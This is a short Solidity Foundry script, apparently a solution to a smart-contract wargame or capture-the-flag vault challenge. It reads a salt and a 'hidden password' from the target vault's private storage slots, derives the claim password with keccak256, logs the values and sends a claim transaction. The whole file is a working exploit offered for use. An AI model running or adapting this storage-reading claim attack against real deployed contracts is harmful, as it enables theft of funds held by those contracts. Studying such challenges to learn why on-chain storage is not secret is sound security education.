// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import {Script, console} from "forge-std/Script.sol";

contract VaultAttackScript is Script {
    address constant VAULT_ADDRESS = 0x2430FF172F1Fb77f36C7acC8A76720DcDC73dDb4;

    function run() public {
        vm.startBroadcast();

        // Get the salt and hidden password from the storage
        uint256 salt = uint256(vm.load(VAULT_ADDRESS, bytes32(0)));
        uint256 hiddenPassword = uint256(
            vm.load(VAULT_ADDRESS, bytes32(uint256(1)))
        );

        // Calculate the password
        uint256 password = uint256(
            keccak256(abi.encode(hiddenPassword + salt))
        );

        // Print the salt, hidden password, and password
        console.log("Salt:", salt);
        console.log("Hidden Password:", hiddenPassword);
        console.log("Password:", password);

        (bool success, bytes memory data) = VAULT_ADDRESS.call(
            abi.encodeWithSignature("claim(uint256)", password)
        );
        require(success, "Claim failed");
        console.log("Claim successful");

        vm.stopBroadcast();
    }
}
